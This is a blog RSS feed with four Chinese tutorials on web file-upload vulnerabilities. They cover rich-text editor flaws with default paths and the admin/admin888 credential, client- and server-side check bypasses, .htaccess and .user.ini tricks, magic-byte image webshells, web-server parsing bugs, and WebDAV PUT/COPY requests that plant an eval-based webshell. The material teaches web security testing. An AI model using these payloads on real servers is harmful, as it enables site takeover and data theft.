<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>文件上传 on </title>
    <link>http://wyb0.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
    <description>Recent content in 文件上传 on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Thu, 21 Jul 2016 15:11:29 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>文件上传之文本编辑器上传漏洞</title>
      <link>http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</link>
      <pubDate>Thu, 21 Jul 2016 15:11:29 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</guid>
      <description>

&lt;h3 id=&#34;0x00-文本编辑器:c56491ab98fb2f0bf06200a2a1185cc0&#34;&gt;0x00 文本编辑器&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;常见的文本编辑器有CKEditor、eWebEditor、UEditor、KindEditor、xhEditor等，它们的功能类似且都有图片上传、视频上传、远程下载等功能，这类文本编辑器也称为富文本编辑器。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-fckeditor:c56491ab98fb2f0bf06200a2a1185cc0&#34;&gt;0x01 FCKeditor&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;下面以FCKeditor(现名为CKEditor)为例：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1、敏感信息暴漏
    * 查看版本信息
        /FCKeditor/editor/dialog/fck_about.html
    * 默认上传页面
        /FCKeditor/editor/filemanager/browser/default/browser.html
        /FCKeditor/editor/filemanager/browser/default/connectors/test.html
        /FCKeditor/editor/filemanager/upload/test.html
        /FCKeditor/editor/filemanager/connectors/test.html
        /FCKeditor/editor/filemanager/connectors/uploadtest.html
    * 其他敏感文件
        /FCKeditor/editor/filemanager/connectors/aspx/connector.html
        /FCKeditor/editor/filemanager/connectors/asp/connector.html
        /FCKeditor/editor/filemanager/connectors/php/connector.php
2、黑名单策略错误
    FCKeditor&amp;lt;=2.4.3版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名
3、任意文件上传漏洞
    FCKeditor的2.4.2及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行，
在form中的action=&amp;quot;http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&amp;quot; 即可，然后上传
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-ewebeditor:c56491ab98fb2f0bf06200a2a1185cc0&#34;&gt;0x02 eWebEditor&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;1、默认后台
    2.80以前为：ewebeditor/admin_login.asp
    2.80以后为：admin/login.asp
2、默认账号密码
    admin   admin888
3、数据库地址
    默认数据库地址
    ewebeditor/db/ewebeditor.mdb
    常用数据库地址
    ewebeditor/db/ewebeditor.asa
    ewebeditor/db/ewebeditor.asa
    ewebeditor/db/#ewebeditor.asa
    ewebeditor/db/#ewebeditor.mdb
    ewebeditor/db/!@#ewebeditor.asp
    ewebeditor/db/ewebeditor1033.mdb
    asp asa为后缀的数据库下载下来后改为mdb
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-参考链接:c56491ab98fb2f0bf06200a2a1185cc0&#34;&gt;0x03 参考链接&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#39;http://navisec.it/编辑器漏洞手册/&#39; target=&#39;_black&#39;&gt;&lt;code&gt;http://navisec.it/编辑器漏洞手册/&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>文件上传之绕过上传漏洞</title>
      <link>http://wyb0.com/posts/file-upload-simple-to-bypass/</link>
      <pubDate>Wed, 20 Jul 2016 17:04:44 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-upload-simple-to-bypass/</guid>
      <description>

&lt;h2 id=&#34;0x00-一般防止上传漏洞手法:014df6cac6c3a4c0396fc122f453c494&#34;&gt;0x00 一般防止上传漏洞手法&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;1、客户端检测：客户端使用JavaScript检测，在文件未上传时，就对文件进行验证
    //任何客户端的验证都是不安全的，客户端验证目的是防止用户输入错误、减少
    //服务器开销，而服务端验证才可以真正防御攻击者。  
2、服务器端检测：服务端脚本一般会检测文件的MIME类型，检测文件扩展名是否合法
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;0x01-客户端检测:014df6cac6c3a4c0396fc122f453c494&#34;&gt;0x01 客户端检测&lt;/h2&gt;

&lt;blockquote&gt;
&lt;h4 id=&#34;客户端验证代码形如下:014df6cac6c3a4c0396fc122f453c494&#34;&gt;客户端验证代码形如下：&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;图片上传&amp;lt;/title&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
    function checkFile(){
        var flag = false;
        var str = document.getElementById(&amp;quot;file&amp;quot;).value;
        str = str.substring(str.lastIndexOf(&#39;.&#39;) + 1);
        var arr = new Array(&#39;png&#39;,&#39;bmp&#39;,&#39;gif&#39;,&#39;jpg&#39;);
        for (var i=0;i&amp;lt;arr.length;i++){
            if(str==arr[i]){
                flag = true;
            }
        }
        if(!flag){
            alert(&#39;文件不合法！&#39;);
        }
        return flag;
    }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;form action=&amp;quot;upload.php&amp;quot; method=&amp;quot;post&amp;quot; onsubmit=&amp;quot;checkFile()&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
        &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; id=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br/&amp;gt;
        &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot; name=&amp;quot;submit&amp;quot; /&amp;gt;
    &amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;接收文件的脚本upload-php代码如下:014df6cac6c3a4c0396fc122f453c494&#34;&gt;接收文件的脚本upload.php代码如下：&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
if(isset($_POST[&amp;quot;submit&amp;quot;])){
    $name = $_FILES[&#39;file&#39;][&#39;name&#39;];
    $name = md5(date(&#39;Y-m-d h:m:s&#39;)).strrchr($name,&amp;quot;.&amp;quot;);
    $size = $_FILES[&#39;file&#39;][&#39;size&#39;];
    $tmp = $_FILES[&#39;file&#39;][&#39;tem_name&#39;];
    move_uploaded_file($tmp,$name);
    echo &amp;quot;文件上传成功！path：&amp;quot;.$name;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;绕过:014df6cac6c3a4c0396fc122f453c494&#34;&gt;绕过：&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;1、可以用firebug将form表单中的onsubmit事件删除，这样就可以绕过验证。
2、使用Burp Suite：
    1）先将木马文件的扩展名改为一张正常图片的扩展名，如jpg
    2）上传时使用Burp Suite拦截数据包，将木马文件扩展名改为php就可绕过客户端验证。
    注意：这里修改文件名字后，请求头中的Content-Length的值也要改
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;0x02-服务端检测:014df6cac6c3a4c0396fc122f453c494&#34;&gt;0x02 服务端检测&lt;/h2&gt;

&lt;h4 id=&#34;服务端分为6项:014df6cac6c3a4c0396fc122f453c494&#34;&gt;服务端分为6项：&lt;/h4&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;* 黑名单与白名单验证
* MIME验证
* 目录验证
* 截断上传攻击
* 文件攻击
* 检测文件内容
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;1-黑名单与白名单验证:014df6cac6c3a4c0396fc122f453c494&#34;&gt;1. 黑名单与白名单验证&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;黑名单过滤方式&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
$Blacklist = array(&#39;asp&#39;,&#39;php&#39;,&#39;jsp&#39;,&#39;php5&#39;,&#39;asa&#39;,&#39;aspx&#39;);    //黑名单
if (isset($_POST[&amp;quot;submit&amp;quot;])){
    $name = $FILES[&#39;file&#39;][&#39;name&#39;];    //接收文件名
    $extension = substr(strrchr($name, &amp;quot;.&amp;quot;) , 1);    //得到扩展名
    $boo = false;
    foreach ($Blaklist as $key =&amp;gt; $value){
        if ($value==$extension) {    //迭代判断是否命中
            $boo = true;
            break;     //命中后直接退出循环
        }
    }
    if (!$boo) {    //若没有被命中，则进行上传操作
        $size = $_FILES[&#39;file&#39;][&#39;size&#39;];  //接收文件大小
        $tmp = $FILES[&#39;file&#39;][&#39;temp_name&#39;];   //临时路径
        move_uploaded_file($tmp, $name);   //移动临时文件到当前文件目录
    } else {
        echo &amp;quot;文件不合法!!&amp;quot;;
    }
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;对于上面的过滤可以通过如下方法绕过：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;* 从黑名单中找到web开发者忽略的扩展名，如：cer
* 没有对扩展名进行大小写转换，在window平台依然可以大小写绕过
* 在window下，若文件名以&amp;quot;.&amp;quot;或者空格作为结尾，系统会自动去除&amp;quot;.&amp;quot;与空格，
  所以可以上传以“asp.”和“asp_”为扩展名的文件
* 0x00截断绕过
* 解析漏洞
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;白名单过滤方式&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
$WhiteList = array(&#39;rar&#39;,&#39;jpg&#39;,&#39;png&#39;,&#39;bmp&#39;,&#39;gif&#39;,&#39;jpg&#39;,&#39;doc&#39;);
if(isset($_POST[&amp;quot;submit&amp;quot;])){
    $name = $_FILES[&#39;file&#39;][&#39;name&#39;];
    $extension = substr(strrchr($name,&amp;quot;.&amp;quot;),1);
    $boo = false;
    foreach($WhiteList as $key =&amp;gt; $value){
        if($value==$extension){
            $boo = true;
        }
    }
    if($boo){
        $size = $_FILES[&#39;file&#39;][&#39;size&#39;];
        $tmp = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
        move_uploaded_file($tmp,$name);
        echo &amp;quot;文件上传成功！&amp;lt;br/&amp;gt;path:&amp;quot;.$name;
    }else{
        echo &amp;quot;文件不合法！&amp;quot;;
    }
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;绕过方法：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;* 0x00截断绕过
* 此时若在iis6.0，则可以将木马名改为test.asp;1.jpg来上传，从而通过验证
* 配合解析漏洞
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;2-mime验证:014df6cac6c3a4c0396fc122f453c494&#34;&gt;2. MIME验证&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;对文件MIME类型做验证的PHP代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
if($_FILES[&#39;file&#39;][&#39;type&#39;]==&amp;quot; image/jpeg&amp;quot;){
    $imageTempName = $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
    $imageName = $_FILES[&#39;file&#39;][&#39;name&#39;];
    $last = substr($imageName,strrpos($imageName,&amp;quot;.&amp;quot;));
    if(!is_dir(&amp;quot;uploadFile&amp;quot;)){
        mkdir(&amp;quot;uploadFile&amp;quot;);
    }
    $imageName = md5($imageName).$last;
    move_upload_file($imageTempName,&amp;quot;./uploadFile/&amp;quot;.$imageName);
    echo(&amp;quot;文件上传成功！ path = /uploadFile/$imageName&amp;quot;);
}else{
    echo(&amp;quot;文件上传类型错误，请重新上传...&amp;quot;);
    exit();
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;未修改MIME类型，上传失败：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/upload_vuln_not_alter_mime.png&#34; alt=&#34;上传漏洞没有修改MIME.png&#34;&gt;
&lt;/div&gt;

修改MIME类型，上传成功：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/upload_vuln_alter_mime.png&#34; alt=&#34;上传漏洞修改MIME.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;3-目录验证:014df6cac6c3a4c0396fc122f453c494&#34;&gt;3. 目录验证&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;文件上传时通常允许用户将文件放到指定的目录中，若目录存在则将文件写入目录，否则新建目录然后写入，若为iis6.0则可以利用这个漏洞，客户端上传代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;up&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;form action=&amp;quot;upload.php&amp;quot; method=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
        &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; /&amp;gt;&amp;lt;br/&amp;gt;
        &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;Extension&amp;quot; value=&amp;quot;up&amp;quot; /&amp;gt;
        &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot; name=&amp;quot;submit&amp;quot; /&amp;gt;
    &amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;服务端PHP接收文件的代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
if($_FILES[&#39;file&#39;][&#39;type&#39;]==&amp;quot;image/jpeg&amp;quot;){
    $imageTempName=$_FILES[&#39;file&#39;][&#39;tmp_name&#39;];
    $imageName=$_FILES[&#39;file&#39;][&#39;name&#39;];
    $last=substr($imageName,strrpos($imageName,&amp;quot;.&amp;quot;));
    if($last!=&amp;quot;.jpg&amp;quot;){
        echo(&amp;quot;mime error!&amp;lt;br/&amp;gt;&amp;quot;);
    }
    $Extension=$_POST[&#39;Extension&#39;];
    if(!is_dir($Extension)){
        mkdir(&amp;quot;./$Extension&amp;quot;);
        echo &amp;quot;mkidr $Extension succesfully&amp;quot;.&amp;quot;&amp;lt;br/&amp;gt;&amp;quot;;
    }
    $imageName=md5($imageName).$last;
    move_uploaded_file($imageTempName,&amp;quot;./$Extension/&amp;quot;.$imageName);
    echo(&amp;quot;upload ok! path = /$Extension/$imageName&amp;quot;);
} else {
    echo(&amp;quot;type error...&amp;quot;);
    exit();
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;查看上传到了那个文件：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/upload_vuln_check_upload_dirname.png&#34; alt=&#34;上传漏洞查看上传到那个文件夹.png&#34;&gt;
&lt;/div&gt;

将文件改名：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/upload_vuln_alter_upload_dirname.png&#34; alt=&#34;上传漏洞尝试更改上传文件夹名字.png&#34;&gt;
&lt;/div&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/upload_vuln_check_asp_dirname.png&#34; alt=&#34;上传漏洞查看asp文件夹是否生成.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;4-截断上传攻击:014df6cac6c3a4c0396fc122f453c494&#34;&gt;4. 截断上传攻击&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;截断上传攻击在ASP程序中比较常见(在PHP、JSP中也有)
先上传正常后缀的图片马：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/upload_vuln_upload_normal_picture.png&#34; alt=&#34;上传漏洞上传正常后缀的图片马.png&#34;&gt;
&lt;/div&gt;

更改图片名字：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/upload_vuln_alter_picture_name.png&#34; alt=&#34;上传漏洞修改图片名字.png&#34;&gt;
&lt;/div&gt;

截断：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/upload_vuln_truncate_picture_name.png&#34; alt=&#34;上传漏洞截断文件名.png&#34;&gt;
&lt;/div&gt;

上传成功：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/upload_vuln_upload_success.png&#34; alt=&#34;上传漏洞成功将jpg图片马上传为asp脚本.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;5-文件攻击:014df6cac6c3a4c0396fc122f453c494&#34;&gt;5. 文件攻击&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;b&gt;.htaccess&lt;/b&gt;文件攻击&lt;br /&gt;
通过.htaccess文件调用php解析器去解析一个文件名中只要包含&amp;rdquo;haha&amp;rdquo;这个字符串的任意文件，无论扩展名是什么(没有也行)，都以php的方式来解析，.haccess文件代码如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;FilesMatch &amp;quot;haha&amp;quot;&amp;gt;
SetHandler application/x-httpd-php
&amp;lt;/FilesMatch&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;或者如下，上传一个文件名为evil.gif的图片马：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;FilesMatch &amp;quot;evil.gif&amp;quot;&amp;gt;
SetHandler application/x-httpd-php
&amp;lt;/FilesMatch&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;或者如下，上传一个后缀为png的图片马：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;Files *.png&amp;gt;
SetHandler application/x-httpd-php
&amp;lt;/Files&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;&lt;b&gt;.user.ini&lt;/b&gt;文件攻击&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;只要中间键是以fastcgi运行的php都可以用这个方法，.user.ini能被动态加载，它也有两个配置
项：auto_append_file和auto_prepend_file，只要在.user.ini中添加auto_prepend_file=aa.jpg
这句话，就可以让其他php文件执行前自动包含aa.jpg，和require()类似。
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/upload_vuln_file_attack1.png&#34; alt=&#34;上传漏洞-文件攻击1.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/upload_vuln_file_attack2.png&#34; alt=&#34;上传漏洞-文件攻击2.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;6-检测文件内容:014df6cac6c3a4c0396fc122f453c494&#34;&gt;6. 检测文件内容&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;文件幻数检测&lt;br /&gt;
在文件首部加上如下幻数，后面跟一句话木马即可&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;JFIF    FF D8 FF E0 00 10 4A 46 49 46
GIF89a  47 49 46 38 39 61
PNG     89 50 4E 47
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;文件相关信息检测&lt;br /&gt;
通常用的getimagesize()函数，只需要在幻数基础上加一些文件信息就行了，如下：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;GIF89a
(...some binary data for image...)
&amp;lt;?php phpinfo(); ?&amp;gt;
(... skipping the rest of binary data ...)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;文件加载检测&lt;br /&gt;
服务端会调用API或函数对文件进行加载测试，常见的是图像渲染测试，变态的甚至是二次渲染：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;对渲染/加载测试的攻击方式是代码注入绕过
对二次渲染的攻击方式是攻击文件加载器本身
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>文件上传之解析漏洞</title>
      <link>http://wyb0.com/posts/file-upload-parse-vulnerability/</link>
      <pubDate>Wed, 20 Jul 2016 16:08:17 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-upload-parse-vulnerability/</guid>
      <description>

&lt;h3 id=&#34;0x00-解析漏洞:58ffd531a0c0eb02b5573c1514e10efe&#34;&gt;0x00 解析漏洞&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;文件上传漏洞通常与Web容器的解析漏洞配合利用
常见Web容器有IIS、Nginx、Apache、Tomcat等
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-iis解析漏洞:58ffd531a0c0eb02b5573c1514e10efe&#34;&gt;0x01 IIS解析漏洞&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;IIS6.0在解析文件时存在以下两个解析漏洞&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1、当建立*.asp、*.asa格式的文件夹时，其目录下任意文件都会被iis当作asp文件来解析。
2、当文件名为*.asp;1.jpg时，IIS6.0同样会以ASP脚本来执行。
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;WebDav漏洞&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    WebDav是一种基于HTTP1.1协议的通信协议，它扩展了HTTP协议。在开启WebDav后若
支持PUT、Move、Copy、Delete等方法，就会存在安全隐患。

测试步骤如下：
    1）通过OPTIONS探测服务器所支持的HTTP方法
    请求：
    OPTIONS / HTTP/1.1
    Host: www.xxxx.com
    2)通过PUT方法向服务器上传shell
    请求：
    PUT /a.txt HTTP/1.1
    Host: www.xxxx.com
    Content-Length: 30

    &amp;lt;%eval request(&amp;quot;chopper&amp;quot;) %&amp;gt;
    3)通过Move或Copy方法改名
    请求：
    COPY /a.txt HTTP/1.1
    Host: www.xxxx.com
    Destination: http://www.xxxx.com/cmd.asp
    4)用DELETE方法删除文件
    请求：
    DELETE /a.txt HTTP/1.1
    Host: www.xxxx.com

注：可用桂林老兵的IIS Write快速探测服务器是否存在WebDav漏洞
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-apache解析漏洞:58ffd531a0c0eb02b5573c1514e10efe&#34;&gt;0x02 Apache解析漏洞&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;在Apache 1.x和Apache 2.x中存在解析漏洞。

Apache在解析文件时有一个原则，当碰到不认识的扩展名时，将会从后向前解析，
直到碰到认识的扩展名为止，如果都不认识，则会暴露其源代码。
如：1.php.rar.sa.xs就会被解析为php，可以据此来绕过文件名限制

可以在Apache安装目录下的文件&amp;quot;/conf/mime.types&amp;quot;中配置Apache可以识别的文件名
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-nginx解析漏洞:58ffd531a0c0eb02b5573c1514e10efe&#34;&gt;0x03 Nginx解析漏洞&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;对低版本的Nginx可以在任意文件名后添加%00.php进行解析攻击
如：上传图片xx.jpg，然后通过改名为xx.jpg%00.php就会解析为php
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-php-cgi解析漏洞:58ffd531a0c0eb02b5573c1514e10efe&#34;&gt;0x04 PHP CGI解析漏洞&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问http://www.xxx.com/x.txt/x.php
时，若x.php不存在，则PHP会递归向前解析，将x.txt当作php脚本来解析

IIS7.0/7.5中：任意文件名/任意文件名.php就会被解析为php
Nginx中：任意文件名/任意文件名.php就会被解析为php
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>文件上传漏洞</title>
      <link>http://wyb0.com/posts/file-upload-vulnerabilities/</link>
      <pubDate>Wed, 20 Jul 2016 11:30:53 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/file-upload-vulnerabilities/</guid>
      <description>

&lt;h3 id=&#34;0x00-文件上传漏洞:86eb896f72ddd2c026201c0935a86030&#34;&gt;0x00 文件上传漏洞&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;当文件上传时，若服务端脚本语言未对上传的文件进行严格验证和过滤，若恶意用户上传恶意的
脚本文件时，就有可能控制整个网站甚至是服务器，这就是文件上传漏洞。
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-权限:86eb896f72ddd2c026201c0935a86030&#34;&gt;0x01 权限&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;1. 后台权限：登陆了后台，可以进行一些操作、配置
2. 网站权限：获得了webshell，可以进行查看源代码等操作
3. 服务器权限：可以对服务器进行任意操作
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-漏洞分类:86eb896f72ddd2c026201c0935a86030&#34;&gt;0x02 漏洞分类&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;1. 配置不当可直接上传shell
    HTTP的PUT方法开启了
2. 文件解析漏洞导致文件执行
    Web容器解析漏洞
3. 本地文件上传限制被绕过
    BurpSuite抓包修改即可绕过
4. 服务端过滤不严或被绕过
    使用了黑名单过滤
5. 文件路径截断上传
    00截断等
6. 开源编辑器上传漏洞
    如CKEditor(FCKeditor的新版)、eWebEditor的漏洞
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-利用条件:86eb896f72ddd2c026201c0935a86030&#34;&gt;0x03 利用条件&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;1. 首先,上传的文件能够被web容器解释执行。所以文件上传后的目录要是web容器所覆盖到的路径
2. 其次,用户能从web访问这个文件
3. 最后,用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容,则可能导致攻击失败
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-漏洞挖掘:86eb896f72ddd2c026201c0935a86030&#34;&gt;0x04 漏洞挖掘&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;1. 查找上传点，如图片、附件、头像的上传等
2. 找类似upload的目录、类似upload.php的文件
3. 找编辑器目录，如eWebEdirot、fckeditor、kingeditor等
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x05-常见可执行文件后缀:86eb896f72ddd2c026201c0935a86030&#34;&gt;0x05 常见可执行文件后缀&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;可用于绕过：
php php2 php3 php5 phtml
asp aspx ascx ashx cer asa
jsp jspx
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>